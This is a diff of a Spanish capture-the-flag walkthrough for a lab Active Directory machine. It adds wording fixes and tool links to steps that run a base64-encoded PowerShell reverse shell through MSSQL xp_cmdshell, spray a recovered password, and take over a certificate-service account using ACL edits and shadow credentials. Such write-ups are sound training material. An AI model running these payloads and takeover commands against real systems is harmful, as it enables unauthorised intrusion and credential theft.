@@ -220,12 +220,13 @@ No son crackeables ya que no obtenemos ninguna password obtenida
 
 
 ## MSSQL Shell Injection
-Cargaremos con el usuario oscar una shell en base64 obtenida de `revshells` usando la `PowerShel #3 (Base64)` y la cargamos en el mssql
+
+Cargaremos con el usuario `oscar` una shell en base64 obtenida de `revshells` usando la `PowerShel #3 (Base64)` y la cargamos en el mssql
 ```shell
 xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 ```
 
-Y nos ponemos en escucha por el puerto `443` con pnelope y obtemeos una shell como usuario `sql_svc`
+Y nos ponemos en escucha por el puerto `443` con penelope y obtemeos una shell como usuario `sql_svc`
 
 ### Shell sql_svc
 Enumeramos los privilegios de nuestro usuario
@@ -239,12 +240,10 @@ SeChangeNotifyPrivilege
 SeCreateGlobalPrivilege      
 ```
 
-
 Enumeramos nuestros directorios con 
 ```shell
 tree /f /a
 ```
-
 
 Enumeramos el directorio de `Users`
 ```shell
@@ -257,7 +256,7 @@ type sql-Configuration.INI
 ```
 
 Encontramos una contraseña `WqSZAF6CysDQbGb3` la guardamos en nuestro fichero de contraseñas
-Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quien le pertenece
+Y volvemos a usar el diccionario de usuarios y la contraseña encontrada para ver a quien le pertenece usando [[CRACKMAPEXEC]]
 ```shell
 nxc smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'
 ```
@@ -269,19 +268,19 @@ ryan::WqSZAF6CysDQbGb3
 
 ### Shell ryan
 
-Vamos a validar si el usuario pertenece a `Remote Management` 
+Vamos a validar si el usuario pertenece a `Remote Management` con [[CRACKMAPEXEC]]
 ```shell
 nxc winrm 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3'
 ```
 
-Vemos que pertenece asi que nos conectamos
+Vemos que pertenece así que nos conectamos usando [[EVIL-WINRM]]
 ```shell
 evil-winrm -i 10.128.232.128 -u ryan -p WqSZAF6CysDQbGb3
 ```
 
 ## BloodHound
 
-Desde fuera en nuestra maquina atacante nos hacemos una recoleccion de informacion para pasarla a [[BLOODHOUND]]
+Desde fuera en nuestra maquina atacante nos hacemos una recolección de información para pasarla a [[BLOODHOUND]]
 ```shell
 bloodhound-python -d sequel.htb -ns 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3' -c ALL --zip
 ```
@@ -292,27 +291,26 @@ Se lo pasamos a [[BLOODHOUND]]
 Buscamos a un usuario que tenemos `pwned`
 ![[Pasted image 20260211201034.png]]
 
-En `Outbound Object control`
+En `Outbound Object control` nos encontramos al usuario `ca_SVX`
 ![[Pasted image 20260211202116.png]]
 
 ### Shadow Credentials
-
-Nos hacemos owned de `ca_svc` con el usuario `ryan`
+Nos hacemos owned de `ca_svc` con el usuario `ryan` usando [[IMPACKET]]
 ```shell
 impacket-owneredit -action write -new-owner 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
 ```
 
-Y después darle control total a `ryan`
+Y después darle control total a `ryan` con [[IMPACKET]]
 ```shell
 impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
 ```
 
-Añadimos las shadow credentials a `ca_svc`
+Añadimos las shadow credentials a `ca_svc` usando [[PYWISKER]]
 ```shell
 pywhisker -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --target ca_svc --action add
 ```
 
-Obtenemos el hash con la informacion obtenida
+Obtenemos el hash con la información obtenida y las pasamos a [[CERTIPY]]
 ```shell
 certipy auth -pfx zX5kmYs5.pfx -password u35mJEVwQSjQTFnmBNSl -username ca_svc -domain sequel.htb -dc-ip 10.129.232.128
 ```
